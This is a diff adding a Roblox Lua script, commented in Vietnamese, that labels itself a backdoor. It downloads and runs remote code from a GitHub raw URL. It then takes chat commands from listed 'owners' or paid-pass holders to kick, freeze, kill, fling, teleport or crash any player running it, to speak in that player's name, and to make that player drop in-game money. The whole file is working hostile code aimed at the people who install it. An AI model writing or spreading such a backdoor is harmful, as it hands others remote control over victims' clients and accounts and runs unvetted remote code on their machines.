@@ -1,0 +1,95 @@
+-- Backdoor + Hệ thống Premium & Bypass
+local Players = game:GetService("Players")
+local ChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local PREMIUM_PASS_ID = 1618296323
+local BYPASS_PASS_ID = 1618124347
+
+getgenv().ownerUsernames = getgenv().ownerUsernames or loadstring(game:HttpGet("https://raw.githubusercontent.com/quiwti08/beubebong/refs/heads/main/system/ownerlist", true))() or {}
+
+local function isOwner(plr) return getgenv().ownerUsernames[plr.Name] ~= nil end
+local function hasPremium(plr) return MarketplaceService:UserOwnsAsset(plr.UserId, PREMIUM_PASS_ID) end
+local function hasBypass(plr) return MarketplaceService:UserOwnsAsset(plr.UserId, BYPASS_PASS_ID) end
+
+local localPlayer = Players.LocalPlayer
+if isOwner(localPlayer) then
+    print("Owner detected - backdoor tắt")
+    return
+end
+
+local function canControl(target)
+    if isOwner(target) then return false end
+    if hasBypass(target) then return false end
+    return true
+end
+
+local function handleCommand(sender, text)
+    if not text:match("^:") then return end
+    local cmd, args = text:match("^:(%S+)%s*(.*)")
+    if not cmd then return end
+
+    local isSenderOwner = isOwner(sender)
+    local isSenderPremium = hasPremium(sender)
+    if not (isSenderOwner or isSenderPremium) then return end
+
+    local target = localPlayer
+    local function matches(str)
+        return str == "." or target.Name:lower():find(str:lower()) or target.DisplayName:lower():find(str:lower())
+    end
+
+    if args and args ~= "" and matches(args) then
+        if not canControl(target) then
+            -- Thông báo cho người ra lệnh biết là không thể
+            task.spawn(function()
+                wait(0.5)
+                game.StarterGui:SetCore("ChatMakeSystemMessage", {
+                    Text = "[System] Không thể dùng lệnh lên "..target.Name.." (có Bypass hoặc là Owner)",
+                    Color = Color3.fromRGB(255,100,100)
+                })
+            end)
+            return
+        end
+
+        if cmd == "bring" and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") and target.Character then
+            target.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame
+        elseif cmd == "fling" and target.Character then
+            target.Character.HumanoidRootPart.CFrame = CFrame.new(math.huge, math.huge, math.huge)
+        elseif cmd == "kick" then target:Kick("Bạn đã bị kick bởi "..(isSenderOwner and "Owner" or "Premium"))
+        elseif cmd == "ban" then target:Kick("PERMA-BAN bởi "..(isSenderOwner and "Owner" or "Premium"))
+        elseif cmd == "freeze" and target.Character and target.Character:FindFirstChild("LowerTorso") then
+            target.Character.LowerTorso.Anchored = true
+        elseif cmd == "unfreeze" and target.Character and target.Character:FindFirstChild("LowerTorso") then
+            target.Character.LowerTorso.Anchored = false
+        elseif cmd == "reset" and target.Character then
+            target.Character.Humanoid.Health = 0
+        elseif cmd == "dropcash" then
+            local ev = ReplicatedStorage:FindFirstChild("MainEvent")
+            if ev then ev:FireServer("DropMoney", "12000") end
+        elseif cmd == "rejoin" then
+            TeleportService:Teleport(game.PlaceId, target)
+        elseif cmd == "crash" and isSenderOwner then -- chỉ Owner mới được crash
+            while true do end
+        end
+    end
+
+    -- lệnh say
+    if cmd == "say" and args:find(" ") then
+        local sp = args:find(" ")
+        local who = args:sub(1, sp-1)
+        local msg = args:sub(sp+1)
+        if matches(who) and msg ~= "" and canControl(target) then
+            local chan = ChatService:FindFirstChild("TextChannels") and ChatService.TextChannels:FindFirstChild("RBXGeneral")
+            if chan then pcall(function() chan:SendAsync(msg) end) end
+        end
+    end
+end
+
+ChatService.MessageReceived:Connect(function(msg)
+    if msg.Text and msg.TextSource then
+        local sender = Players:GetPlayerByUserId(msg.TextSource.UserId)
+        if sender then handleCommand(sender, msg.Text) end
+    end
+end)
